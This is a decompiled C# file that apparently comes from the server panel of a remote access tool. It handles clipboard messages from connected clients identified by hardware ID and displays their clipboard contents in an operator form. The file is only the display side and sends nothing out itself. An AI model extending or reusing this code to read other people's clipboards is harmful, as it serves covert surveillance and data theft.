using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000043 RID: 67
	internal class HandlerClipboard
	{
		// Token: 0x060001B7 RID: 439 RVA: 0x0001BEA8 File Offset: 0x0001A0A8
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Error"))
				{
					if (!(a == "Get"))
					{
						return;
					}
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormClipboard form = (FormClipboard)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.richTextBox1.Text = (string)objects[2];
					}));
					return;
				}
				else
				{
					if (client.Tag == null)
					{
						client.Disconnect();
						return;
					}
					FormClipboard form = (FormClipboard)client.Tag;
					form.Invoke(new MethodInvoker(delegate()
					{
						form.richTextBox1.Text = "Error: " + (string)objects[2] + "\n";
					}));
					return;
				}
			}
			else
			{
				FormClipboard form = (FormClipboard)Application.OpenForms["Clipboard:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Clipboard [" + (string)objects[2] + "]";
					form.client = client;
					form.richTextBox1.Enabled = true;
					form.rjButton1.Enabled = true;
					form.rjButton2.Enabled = true;
					form.rjButton3.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
